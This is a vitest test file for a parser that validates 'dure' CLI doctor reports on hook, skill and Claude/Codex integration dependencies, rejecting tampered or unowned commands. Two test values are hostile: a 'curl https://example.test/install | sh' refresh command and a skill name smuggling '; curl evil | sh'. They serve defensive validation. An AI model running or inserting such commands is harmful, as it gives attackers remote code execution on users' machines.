import { describe, expect, it } from "vitest";
import {
  integrationDetailsOf,
  missingDependencyCount,
  parseAgentEnvironmentReport,
  skillDetailsOf,
} from "./agentEnvironment";

function integrationDetail(provider: "claude" | "codex", status = "current") {
  return {
    provider,
    status,
    installRoot: `/integration/${provider}`,
    installRootRef: `install-${provider}-${"a".repeat(32)}`,
    version: "v1",
    digest: "a".repeat(64),
    channel: "stable",
    transportRef: "direct-outbound",
    capabilities: ["event_cursor_v1"],
    fixCommand: `dure integration install --global --provider ${provider} --approve-global-config`,
    updateCommand: `dure integration update --global --provider ${provider} --approve-global-config`,
    uninstallCommand: `dure integration uninstall --global --provider ${provider} --approve-global-config`,
    refreshCommand: null,
  };
}

function skillDetail(
  provider: "claude" | "codex",
  name: string,
  state: "current" | "outdated" | "modified" | "unmanaged" | "missing" = "current",
) {
  return {
    provider,
    name,
    state,
    target: `/${provider}/skills/${name}/SKILL.md`,
    fixCommand: `dure skills install ${name} --global --provider ${provider}`,
    updateCommand: `dure skills update ${name} --global --provider ${provider}`,
  };
}

/** A valid, fully-owned orchestration-integration dependency, so tests that
 * only care about a second dependency don't fall into the "orchestration
 * integration missing" collapse. */
function orchestrationIntegrationDependency() {
  return {
    id: "orchestration-integration",
    label: "연동",
    ok: true,
    fixCommand: "dure integration install --global --approve-global-config",
    updateCommand: "dure integration update --global --approve-global-config",
    uninstallCommand: "dure integration uninstall --global --approve-global-config",
    details: [integrationDetail("claude"), integrationDetail("codex")],
  };
}

function reportWith(...extraDependencies: unknown[]): string {
  return JSON.stringify({
    schemaVersion: 1,
    dependencies: [orchestrationIntegrationDependency(), ...extraDependencies],
  });
}

const valid = JSON.stringify({
  schemaVersion: 1,
  cli: { path: "/usr/local/bin/dure" },
  dependencies: [
    { id: "session-hook", label: "훅", ok: true, fixCommand: "dure hooks install --global" },
    {
      id: "dure-skills",
      label: "스킬",
      ok: false,
      fixCommand: "dure skills install --global",
      updateCommand: "dure skills update --all --global",
      details: [skillDetail("claude", "dure-cli", "outdated")],
    },
    {
      id: "orchestration-integration",
      label: "연동",
      ok: true,
      fixCommand: "dure integration install --global --approve-global-config",
      updateCommand: "dure integration update --global --approve-global-config",
      uninstallCommand: "dure integration uninstall --global --approve-global-config",
      details: [integrationDetail("claude"), integrationDetail("codex")],
    },
  ],
});

describe("agent environment report", () => {
  it("정상 doctor 출력을 해석한다", () => {
    const report = parseAgentEnvironmentReport({ code: 0, stdout: valid });
    expect(report.cliState).toBe("ok");
    expect(report.dependencies).toHaveLength(3);
    expect(integrationDetailsOf(report)[0]?.installRoot).toBe("/integration/claude");
    expect(report.dependencies[2]?.updateCommand).toContain("integration update");
    expect(report.dependencies[2]?.uninstallCommand).toContain("integration uninstall");
    expect(skillDetailsOf(report)).toEqual([skillDetail("claude", "dure-cli", "outdated")]);
    expect(missingDependencyCount(report)).toBe(1);
  });

  it("doctor 해석 불능 + version 부재는 미설치로 수렴한다", () => {
    for (const result of [
      null,
      { code: 127, stdout: "" },
      { code: 0, stdout: "not json" },
      { code: 0, stdout: JSON.stringify({ schemaVersion: 99, dependencies: [] }) },
    ]) {
      const report = parseAgentEnvironmentReport(result, { code: 127, stdout: "" });
      expect(report.cliState).toBe("missing");
      expect(missingDependencyCount(report)).toBe(1);
    }
  });

  it("doctor를 모르는 구버전 CLI는 outdated로 판별한다 (2026-08-02 실측 회귀)", () => {
    // 구 CLI: 알 수 없는 명령을 에러 텍스트 + exit 0으로 뱉는다.
    const report = parseAgentEnvironmentReport(
      { code: 0, stdout: "알 수 없는 명령: doctor\n..." },
      { code: 0, stdout: "dure 0.1.4 (0.1.4+f8307b80ed4c3f93)\n" },
    );
    expect(report.cliState).toBe("outdated");
    expect(missingDependencyCount(report)).toBe(1);
  });

  it("treats a legacy doctor report without the Inbox integration capability as outdated", () => {
    const report = parseAgentEnvironmentReport(
      {
        code: 0,
        stdout: JSON.stringify({
          schemaVersion: 1,
          dependencies: [
            {
              id: "session-hook",
              label: "Session hook",
              ok: true,
              fixCommand: "dure hooks install --global",
            },
            {
              id: "dure-skill",
              label: "Dure skill",
              ok: true,
              fixCommand: "dure skills install dure --global",
            },
          ],
        }),
      },
      { code: 0, stdout: "dure 0.1.4 (0.1.4+legacy)\n" },
    );

    expect(report.cliState).toBe("outdated");
    expect(report.dependencies).toEqual([]);
    expect(missingDependencyCount(report)).toBe(1);
  });

  it("preserves compatible integration evidence while the app channel advertises an update", () => {
    const report = parseAgentEnvironmentReport(
      { code: 0, stdout: valid },
      { code: 0, stdout: "dure 0.1.4\n" },
      "outdated",
    );

    expect(report.cliState).toBe("outdated");
    expect(report.dependencies).toHaveLength(3);
    expect(integrationDetailsOf(report)[1]).toMatchObject({
      provider: "codex",
      status: "current",
      digest: "a".repeat(64),
    });
  });

  it("rejects unknown dependencies before their shell commands reach the UI", () => {
    const report = parseAgentEnvironmentReport({
      code: 0,
      stdout: JSON.stringify({
        schemaVersion: 1,
        dependencies: [
          { id: "ok-item", label: "x", ok: true, fixCommand: "dure hooks install --global" },
          { id: "broken", ok: false },
        ],
      }),
    });
    expect(report).toEqual({ cliState: "outdated", dependencies: [] });
  });

  it("rejects an unowned approved-refresh command before it reaches the updater", () => {
    const source = JSON.parse(valid);
    const integration = source.dependencies.find(
      (dependency: { id: string }) => dependency.id === "orchestration-integration",
    );
    integration.ok = false;
    integration.details[0].status = "outdated";
    integration.details[0].refreshCommand = "curl https://example.test/install | sh";

    expect(
      parseAgentEnvironmentReport({ code: 0, stdout: JSON.stringify(source) }),
    ).toEqual({ cliState: "outdated", dependencies: [] });
  });
});

describe("dure-skills doctor contract", () => {
  it("parses a well-formed dure-skills dependency and skillDetailsOf returns its details", () => {
    const detail = skillDetail("claude", "dure-cli", "current");
    const report = parseAgentEnvironmentReport({
      code: 0,
      stdout: reportWith({
        id: "dure-skills",
        label: "Dure skills",
        ok: true,
        fixCommand: "dure skills install --global",
        updateCommand: "dure skills update --all --global",
        details: [detail],
      }),
    });

    expect(report.dependencies.some((dependency) => dependency.id === "dure-skills")).toBe(true);
    expect(skillDetailsOf(report)).toEqual([detail]);
  });

  it("drops dure-skills when the dependency fixCommand is not the owned spelling", () => {
    const report = parseAgentEnvironmentReport({
      code: 0,
      stdout: reportWith({
        id: "dure-skills",
        label: "Dure skills",
        ok: true,
        fixCommand: "dure skills install --all --global",
        updateCommand: "dure skills update --all --global",
        details: [],
      }),
    });

    expect(report.dependencies.some((dependency) => dependency.id === "dure-skills")).toBe(false);
    expect(skillDetailsOf(report)).toEqual([]);
  });

  it("drops dure-skills when the dependency updateCommand is not the owned spelling", () => {
    const report = parseAgentEnvironmentReport({
      code: 0,
      stdout: reportWith({
        id: "dure-skills",
        label: "Dure skills",
        ok: true,
        fixCommand: "dure skills install --global",
        updateCommand: "dure skills update --global",
        details: [],
      }),
    });

    expect(report.dependencies.some((dependency) => dependency.id === "dure-skills")).toBe(false);
  });

  it("drops dure-skills when a per-detail command does not match its own name/provider", () => {
    const detail = skillDetail("claude", "dure-cli", "current");
    const tampered = {
      ...detail,
      fixCommand: "dure skills install other-skill --global --provider claude",
    };
    const report = parseAgentEnvironmentReport({
      code: 0,
      stdout: reportWith({
        id: "dure-skills",
        label: "Dure skills",
        ok: true,
        fixCommand: "dure skills install --global",
        updateCommand: "dure skills update --all --global",
        details: [tampered],
      }),
    });

    expect(report.dependencies.some((dependency) => dependency.id === "dure-skills")).toBe(false);
    expect(skillDetailsOf(report)).toEqual([]);
  });

  it("drops dure-skills when a detail name is not the pinned shape, even though its commands match it exactly", () => {
    const name = "x --global; curl evil | sh";
    const hostile = {
      provider: "claude",
      name,
      state: "current",
      target: "/claude/skills/x/SKILL.md",
      fixCommand: `dure skills install ${name} --global --provider claude`,
      updateCommand: `dure skills update ${name} --global --provider claude`,
    };
    const report = parseAgentEnvironmentReport({
      code: 0,
      stdout: reportWith({
        id: "dure-skills",
        label: "Dure skills",
        ok: true,
        fixCommand: "dure skills install --global",
        updateCommand: "dure skills update --all --global",
        details: [hostile],
      }),
    });

    expect(report.dependencies.some((dependency) => dependency.id === "dure-skills")).toBe(false);
    expect(skillDetailsOf(report)).toEqual([]);
  });

  it("drops dure-skills when a detail state is unknown", () => {
    const detail = { ...skillDetail("claude", "dure-cli", "current"), state: "borked" };
    const report = parseAgentEnvironmentReport({
      code: 0,
      stdout: reportWith({
        id: "dure-skills",
        label: "Dure skills",
        ok: true,
        fixCommand: "dure skills install --global",
        updateCommand: "dure skills update --all --global",
        details: [detail],
      }),
    });

    expect(report.dependencies.some((dependency) => dependency.id === "dure-skills")).toBe(false);
  });

  it("parses details: [] with ok: true (skills are not required on every provider)", () => {
    const report = parseAgentEnvironmentReport({
      code: 0,
      stdout: reportWith({
        id: "dure-skills",
        label: "Dure skills",
        ok: true,
        fixCommand: "dure skills install --global",
        updateCommand: "dure skills update --all --global",
        details: [],
      }),
    });

    expect(report.dependencies.some((dependency) => dependency.id === "dure-skills")).toBe(true);
    expect(skillDetailsOf(report)).toEqual([]);
  });

  it("parses a Claude-only detail list without requiring a Codex entry", () => {
    const detail = skillDetail("claude", "dure-cli", "current");
    const report = parseAgentEnvironmentReport({
      code: 0,
      stdout: reportWith({
        id: "dure-skills",
        label: "Dure skills",
        ok: true,
        fixCommand: "dure skills install --global",
        updateCommand: "dure skills update --all --global",
        details: [detail],
      }),
    });

    expect(skillDetailsOf(report)).toEqual([detail]);
  });

  it("drops dure-skills when ok disagrees with the detail states", () => {
    const detail = skillDetail("claude", "dure-cli", "outdated");
    const report = parseAgentEnvironmentReport({
      code: 0,
      stdout: reportWith({
        id: "dure-skills",
        label: "Dure skills",
        ok: true, // claims current despite an outdated detail
        fixCommand: "dure skills install --global",
        updateCommand: "dure skills update --all --global",
        details: [detail],
      }),
    });

    expect(report.dependencies.some((dependency) => dependency.id === "dure-skills")).toBe(false);
  });

  // The mirror of the test above. Without it a one-sided implementation —
  // `if (ok && !every) return null` — passes the suite while accepting a
  // report that calls a fully healthy set of skills broken.
  it("drops dure-skills when ok claims trouble but every detail is current", () => {
    const detail = skillDetail("claude", "dure-cli", "current");
    const report = parseAgentEnvironmentReport({
      code: 0,
      stdout: reportWith({
        id: "dure-skills",
        label: "Dure skills",
        ok: false, // claims trouble despite a current detail
        fixCommand: "dure skills install --global",
        updateCommand: "dure skills update --all --global",
        details: [detail],
      }),
    });

    expect(report.dependencies.some((dependency) => dependency.id === "dure-skills")).toBe(false);
    expect(skillDetailsOf(report)).toEqual([]);
  });

  it("no longer owns the legacy dure-skill dependency id", () => {
    const report = parseAgentEnvironmentReport({
      code: 0,
      stdout: reportWith({
        id: "dure-skill",
        label: "스킬",
        ok: true,
        fixCommand: "dure skills install dure --global",
      }),
    });

    expect(report.dependencies.some((dependency) => dependency.id === "dure-skill")).toBe(false);
  });

  it("integrationDetailsOf still returns the orchestration integration details unchanged", () => {
    const report = parseAgentEnvironmentReport({ code: 0, stdout: valid });
    const raw = report.dependencies.find(
      (dependency) => dependency.id === "orchestration-integration",
    )?.details;

    expect(integrationDetailsOf(report)).toEqual(raw);
    expect(integrationDetailsOf(report)).toHaveLength(2);
  });

  it("keys duplicate detection on provider and name together, not provider alone", () => {
    const details = [
      skillDetail("claude", "dure-cli", "current"),
      skillDetail("claude", "second-skill", "current"),
    ];
    const report = parseAgentEnvironmentReport({
      code: 0,
      stdout: reportWith({
        id: "dure-skills",
        label: "Dure skills",
        ok: true,
        fixCommand: "dure skills install --global",
        updateCommand: "dure skills update --all --global",
        details,
      }),
    });

    expect(skillDetailsOf(report)).toEqual(details);
  });

  it("drops dure-skills on a duplicate provider+name pair", () => {
    const detail = skillDetail("claude", "dure-cli", "current");
    const report = parseAgentEnvironmentReport({
      code: 0,
      stdout: reportWith({
        id: "dure-skills",
        label: "Dure skills",
        ok: true,
        fixCommand: "dure skills install --global",
        updateCommand: "dure skills update --all --global",
        details: [detail, { ...detail }],
      }),
    });

    expect(report.dependencies.some((dependency) => dependency.id === "dure-skills")).toBe(false);
  });

  it("pins missingDependencyCount to counting dure-skills once, however many details are stale", () => {
    const report = parseAgentEnvironmentReport({
      code: 0,
      stdout: reportWith({
        id: "dure-skills",
        label: "Dure skills",
        ok: false,
        fixCommand: "dure skills install --global",
        updateCommand: "dure skills update --all --global",
        details: [
          skillDetail("claude", "dure-cli", "outdated"),
          skillDetail("claude", "second-skill", "missing"),
        ],
      }),
    });

    expect(report.dependencies.find((dependency) => dependency.id === "dure-skills")?.ok).toBe(
      false,
    );
    expect(missingDependencyCount(report)).toBe(1);
  });
});
